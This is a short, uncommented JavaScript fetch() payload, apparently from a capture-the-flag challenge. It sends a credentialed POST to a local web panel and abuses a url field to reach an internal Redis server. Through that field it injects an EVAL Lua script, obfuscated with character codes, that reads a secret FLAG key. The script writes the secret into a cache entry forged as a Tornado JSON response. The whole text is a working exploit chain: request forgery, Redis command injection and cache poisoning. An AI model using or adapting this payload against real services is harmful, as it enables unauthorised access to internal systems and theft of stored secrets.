fetch("http://127.0.0.1:1337/panel", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://127.0.0.1:1337",
    "Referer": "http://127.0.0.1:1337/panel"
  },
  body: "url=http%3A%2F%2F127.0.0.1%3A6379&EVAL+%27local+b%3D%22sth=final%22%3Blocal+g%3Dstring.char%2871%2C69%2C84%29%3Blocal+s%3Dstring.char%2883%2C69%2C84%29%3Blocal+k%3Dstring.char%2870%2C76%2C65%2C71%29%3Blocal+f%3Dredis.call%28g%2Ck%29%3Blocal+inner%3Dcjson.encode%28%7Bsearches%3D%7Bf%7D%7D%29%3Blocal+j%3D%7Bbody%3Dinner%2Cstatus_code%3D200%2Cheaders%3D%7B%5B%22Content-Type%22%5D%3D%7B%22application%2Fjson%3B+charset%3DUTF-8%22%7D%2C%5B%22Content-Length%22%5D%3D%7Btostring%28string.len%28inner%29%29%7D%2C%5B%22Server%22%5D%3D%7B%22TornadoServer%2F6.4.2%22%7D%7D%7D%3Bredis.call%28s%2CARGV%5B2%5D%2Ccjson.encode%28j%29%29%3Breturn+1%27+0+dummy+5b38e3c2ce0152ebd476f5aaa6f8076db11868718f022cb511ba63176a4c16e0"});
